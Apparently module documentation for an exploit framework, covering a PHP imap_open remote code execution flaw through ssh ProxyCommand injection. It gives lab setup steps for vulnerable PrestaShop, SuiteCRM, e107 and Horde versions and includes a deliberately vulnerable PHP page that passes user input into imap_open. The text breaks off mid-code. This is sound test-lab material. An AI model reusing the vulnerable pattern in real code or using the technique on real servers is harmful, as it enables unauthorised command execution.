{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/http/php_imap_open_rce","result":{"data":{"moduleMetadataJson":{"id":"96d89511-05ae-5483-b452-0fbca20e1048","name":"php imap_open Remote Code Execution","fullname":"exploit/linux/http/php_imap_open_rce","description":"The imap_open function within php, if called without the /norsh flag, will attempt to preauthenticate an\n        IMAP session.  On Debian based systems, including Ubuntu, rsh is mapped to the ssh binary.  Ssh's ProxyCommand\n        option can be passed from imap_open to execute arbitrary commands.\n        While many custom applications may use imap_open, this exploit works against the following applications:\n        e107 v2, prestashop, SuiteCRM, as well as Custom, which simply prints the exploit strings for use.\n        Prestashop exploitation requires the admin URI, and administrator credentials.\n        suiteCRM/e107 require administrator credentials.  Fixed in php 5.6.39.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/http/php_imap_open_rce","documentationSlug":"/modules/documentation/exploit/linux/http/php_imap_open_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The <a href=\"http://php.net/manual/en/function.imap-open.php\">imap_open</a> function within php,\nif called without the <code class=\"language-text\">/norsh</code> flag, will attempt to preauthenticate an IMAP session.\nOn Debian based systems, including Ubuntu, <code class=\"language-text\">rsh</code> is mapped to the ssh binary. Ssh's\n<code class=\"language-text\">ProxyCommand</code> option can be passed from <code class=\"language-text\">imap_open</code> to execute arbitrary commands.\nWhile many custom applications may use <code class=\"language-text\">imap_open</code>, it is reported that the following\napplications are vulnerable: </p>\n<ul>\n<li><a href=\"https://github.com/PrestaShop/PrestaShop/blob/0d53d6b58b951ac364ad44671cf1ae9bf7ab6aed/controllers/admin/AdminCustomerThreadsController.php#L1010\">prestashop</a></li>\n<li><a href=\"https://github.com/salesagility/SuiteCRM/blob/153b2bae76097cdba9fc9c025bcd829a702b8687/modules/InboundEmail/EditView.php#L260\">SuiteCRM</a></li>\n<li><a href=\"https://github.com/e107inc/e107/blob/7570b7ce4e17c03e9759c90889db8e750d566e53/e107_handlers/pop_bounce_handler.php#L83\">e107 v2</a></li>\n<li>\n<p>Horde IMP H3</p>\n<p>Prestashop exploitation requires the admin URI, and administrator credentials.</p>\n<p>SuiteCRM exploitation requires administrator credentials.</p>\n<p>e107 v2 exploitation requires administrator credentials.</p>\n<p>Horde IMP H3 requires the IMP test page to be present (default), but no credentials are required.</p>\n<p>Additional applications were reported vulnerable, but exploits were not written. See <a href=\"https://github.com/rapid7/metasploit-framework/pull/10987\">#10987</a> for additional details.</p>\n</li>\n</ul>\n<h3 id=\"prestashop-1724-on-ubuntu-1604\" style=\"position:relative;\"><a href=\"#prestashop-1724-on-ubuntu-1604\" aria-label=\"prestashop 1724 on ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Prestashop 1.7.2.4 on Ubuntu 16.04</h3>\n<p>Mostly derived from <a href=\"https://websiteforstudents.com/install-prestashop-on-ubuntu-17-04-17-10-with-apache2-mariadb-and-php/\">websiteforstudents.com</a>,\nwith a few tweeks for Ubuntu 16.04, and to install PHP's imap mod.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt install apache2\nsudo sed -i &quot;s/Options Indexes FollowSymLinks/Options FollowSymLinks/&quot; /etc/apache2/apache2.conf\nsudo systemctl stop apache2.service\nsudo systemctl start apache2.service\nsudo systemctl enable apache2.service\nsudo apt-get install mariadb-server mariadb-client\nsudo systemctl stop mysql.service\nsudo systemctl start mysql.service\nsudo systemctl enable mysql.service\nsudo mysql_secure_installation\nsudo systemctl restart mysql.service\nsudo apt install php libapache2-mod-php php-common php-mbstring php-xmlrpc php-soap php-gd php-xml php-intl php-mysql php-cli php-mcrypt php-ldap php-zip php-curl php-imap\nsudo phpenmod imap\nsudo mysql -u root -p</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Run the following database commands:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">CREATE DATABASE prestashop;\nCREATE USER &#39;prestashopuser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new_password_here&#39;;\nGRANT ALL ON prestashop.* TO &#39;prestashopuser&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;user_password_here&#39; WITH GRANT OPTION;\nFLUSH PRIVILEGES;\nEXIT;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">cd /tmp &amp;&amp; curl -O https://download.prestashop.com/download/releases/prestashop_1.7.2.4.zip\nunzip prestashop_1.7.2.4.zip\nsudo mkdir -p /var/www/html/prestashop\nsudo unzip prestashop.zip -d /var/www/html/prestashop/\nsudo chown -R www-data:www-data /var/www/html/prestashop/\nsudo chmod -R 755 /var/www/html/prestashop/\nsudo nano /etc/apache2/sites-available/prestashop.conf</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Utilize the following configuration:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&amp;lt;VirtualHost *:80&gt;\n     ServerAdmin admin@example.com\n     DocumentRoot /var/www/html/prestashop/\n     ServerName example.com\n     ServerAlias www.example.com\n     \n     &amp;lt;Directory /var/www/html/prestashop/&gt;\n        Options +FollowSymlinks\n        AllowOverride All\n        Require all granted\n     &amp;lt;/Directory&gt;\n     \n     ErrorLog ${APACHE_LOG_DIR}/error.log\n     CustomLog ${APACHE_LOG_DIR}/access.log combined\n     \n&amp;lt;/VirtualHost&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo a2ensite prestashop.conf\nsudo a2enmod rewrite\nsudo a2dissite 000-default\nsudo systemctl restart apache2.service</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Browse to the website, and install with default information.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo rm -rf /var/www/html/prestashop/install/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Now browse to <code class=\"language-text\">/admin</code>, and the first time you'll be redirected to the admin URI.  If not, <code class=\"language-text\">sudo ls /var/www/html/prestashop/admin*</code>.</p>\n<h3 id=\"suitecrm-7823-on-ubuntu-1604\" style=\"position:relative;\"><a href=\"#suitecrm-7823-on-ubuntu-1604\" aria-label=\"suitecrm 7823 on ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SuiteCRM 7.8.23 on Ubuntu 16.04</h3>\n<p>Mostly derived from <a href=\"https://www.vultr.com/docs/how-to-install-suitecrm-on-ubuntu-16-04\">vultr.com</a> but adding php's zip and mbstring packages.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt-get install apache2 mariadb-server php7.0 php7.0-mysql php7.0-gd php7.0-curl php7.0-imap libapache2-mod-php7.0 php7.0-mcrypt php7.0-xml php7.0-json php7.0-mbstring php7.0-zip -y\nsudo systemctl restart apache2\nsudo phpenmod imap\nsudo mysql_secure_installation</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">wget https://suitecrm.com/files/156/SuiteCRM-7.8/322/SuiteCRM-7.8.23.zip\nunzip SuiteCRM-7.8.23.zip\nsudo mv SuiteCRM-7.8.23 /var/www/html/suitecrm\nsudo chown -R www-data:www-data /var/www/html/suitecrm\nsudo chmod -R 777 /var/www/html/suitecrm\nsudo nano /etc/apache2/sites-available/suitecrm.conf</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Utilize the following configuration:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&amp;lt;VirtualHost *:80&gt;\n ServerAdmin admin@yourdomain.com\n DocumentRoot /var/www/html/suitecrm/\n ServerName yourdomain.com\n ServerAlias www.yourdomain.com\n&amp;lt;Directory /var/www/html/suitecrm/&gt;\n Options FollowSymLinks\n AllowOverride All\n&amp;lt;/Directory&gt;\n ErrorLog /var/log/apache2/suitecrm-error_log\n CustomLog /var/log/apache2/suitecrm-access_log common\n&amp;lt;/VirtualHost&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo a2ensite suitecrm\nsudo a2dissite 000-default.conf\nsudo systemctl restart apache2\nsudo systemctl restart mysql</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"e107-219-on-ubuntu-1604\" style=\"position:relative;\"><a href=\"#e107-219-on-ubuntu-1604\" aria-label=\"e107 219 on ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>e107 2.1.9 on Ubuntu 16.04</h3>\n<p>Mostly derived from <a href=\"https://websiteforstudents.com/install-e107-cms-on-ubuntu-16-04-18-04-18-10-with-apache2-mariadb-and-php-7-2/\">websiteforstudents.com</a>,\nhowever with php 7.0 instead of 7.2.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt install apache2 mariadb-server mariadb-client php7.0 libapache2-mod-php7.0 php7.0-common php7.0-mysql php7.0-gmp php7.0-curl php7.0-intl php7.0-mbstring php7.0-xmlrpc php7.0-gd php7.0-bcmath php7.0-xml php7.0-cli php7.0-zip php7.0-imap -y\nsudo systemctl restart apache2.service\nsudo systemctl stop mysql.service\nsudo systemctl start mysql.service\nsudo systemctl enable mysql.service\nsudo mysql_secure_installation\nsudo mysql -u root -p</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Run the following database commands:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">CREATE DATABASE e107;\nCREATE USER &#39;e107user&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new_password_here&#39;;\nGRANT ALL ON e107.* TO &#39;e107user&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;new_password_here&#39; WITH GRANT OPTION;\nFLUSH PRIVILEGES;\nEXIT;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">cd /tmp\nwget http://sourceforge.net/projects/e107/files/e107/e107%20v2.1.9/e107_2.1.9_full.zip\nsudo unzip -d /var/www/html/e107 /tmp/e107_2.1.9_full.zip\nsudo chown -R www-data:www-data /var/www/html/e107/\nsudo chmod -R 755 /var/www/html/e107/\nsudo nano /etc/apache2/sites-available/e107.conf</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Utilize the following configuration:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">&amp;lt;VirtualHost *:80&gt;\n     ServerAdmin admin@example.com\n     DocumentRoot /var/www/html/e107\n     ServerName example.com\n     ServerAlias www.example.com\n\n     &amp;lt;Directory /var/www/html/e107/&gt;\n          Options FollowSymlinks\n          AllowOverride All\n          Require all granted\n     &amp;lt;/Directory&gt;\n\n     ErrorLog ${APACHE_LOG_DIR}/error.log\n     CustomLog ${APACHE_LOG_DIR}/access.log combined\n    \n     &amp;lt;Directory /var/www/html/e107/&gt;\n            RewriteEngine on\n            RewriteBase /\n            RewriteCond %{REQUEST_FILENAME} !-f\n            RewriteRule ^(.*) index.php [PT,L]\n    &amp;lt;/Directory&gt;\n&amp;lt;/VirtualHost&gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo a2ensite e107.conf\nsudo a2enmod rewrite\nsudo a2dissite 000-default\nsudo systemctl restart apache2.service\nsudo systemctl restart mysql.server\nsudo systemctl restart mysql.service</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"horde-imp-h3-on-ubuntu-1604\" style=\"position:relative;\"><a href=\"#horde-imp-h3-on-ubuntu-1604\" aria-label=\"horde imp h3 on ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Horde IMP H3 on Ubuntu 16.04</h3>\n<p>This worked until about Jan 11, 2019 when ondrej updated php5.6 passed 38.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo add-apt-repository ppa:ondrej/php\nsudo apt-get update\nsudo apt-get --no-install-recommends install -y php-pear\nsudo apt-get install -y php5.6 libapache2-mod-php5.6 php5.6-mysql php5.6-mbstring php5.6-mysql php5.6-curl php5.6-xml php5.6-xmlrpc php5.6-imap\nsudo update-alternatives --config php\nsudo a2enmod  php5.6\nsudo a2dismod php7.1\nsudo phpenmod imap\nsudo service apache2 restart\nwget ftp://ftp.horde.org/pub/imp/imp-h3-4.2.tar.gz\nwget ftp://ftp.horde.org/pub/horde/horde-3.3.13.tar.gz\ntar zxf horde-3.3.13.tar.gz\nsudo mv horde-3.3.13 /var/www/html/\ntar zxf imp-h3-4.2.tar.gz\nsudo mv imp-h3-4.2 /var/www/html/horde-3.3.13/\nsudo mv /var/www/html/horde-3.3.13/ /var/www/html/horde\ncd /var/www/html/horde\nsudo mv imp-h3-4.2/ imp\ncd imp/config\nsudo cp mime_drivers.php.dist mime_drivers.php\nsudo cp prefs.php.dist prefs.php\nsudo cp servers.php.dist servers.php\nsudo chown -R www-data:www-data /var/www/html/horde/\ncurl -s http://127.0.0.1/horde/imp/test.php | grep &quot;PHP Mail Server Support Test&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Browse to the site, click Administration -> Setup.  Click the caution and stop icons and then \"Generate Horde Configuration\", and \"Generate Mail Configuration\".\nThe test page is located at <code class=\"language-text\">/horde/imp/test.php</code>.</p>\n<h3 id=\"custom-page-on-ubuntu-1604\" style=\"position:relative;\"><a href=\"#custom-page-on-ubuntu-1604\" aria-label=\"custom page on ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Custom Page on Ubuntu 16.04</h3>\n<p>Make sure <code class=\"language-text\">php-imap</code> is installed and enabled.  Create <code class=\"language-text\">imap.php</code> with the following content.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>imap_open Exploitable Page<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>There are two ways to exploit this page:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ol</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span><span class=\"token punctuation\">></span></span>GET:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">></span></span> Use URL parameter 'server'.  Ex http://1.1.1.1/imap.php?server=EXPLOITHERE<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span><span class=\"token punctuation\">></span></span>POST: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">></span></span> Using parameter 'server' or the form below.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ol</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      Server: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>server<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span>\n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"server\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"server\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$server</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"server\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$server</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"server\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$server</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$server</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;hr>&lt;h2>Results:&lt;/h2>\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$mbox</span> <span class=\"token operator\">=</span> @<span class=\"token function\">imap_open</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"{\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$server</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\":143}INBOX\"</span><span class=\"token punctuation\">,</span><span class=\"token single-quoted-string string\">'username'</span><span class=\"token punctuation\">,</span><span class=\"token single-quoted-string string\">'password'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'&lt;p>&lt;b>Received: &lt;/b>'</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$server</span><span class=\"token punctuation\">.</span><span class=\"token single-quoted-string string\">'&lt;/p>'</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token variable\">$errors</span> <span class=\"token operator\">=</span> <span class=\"token function\">imap_errors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errors</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$errors</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_unique</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errors</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$errors</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_array</span><span class=\"token 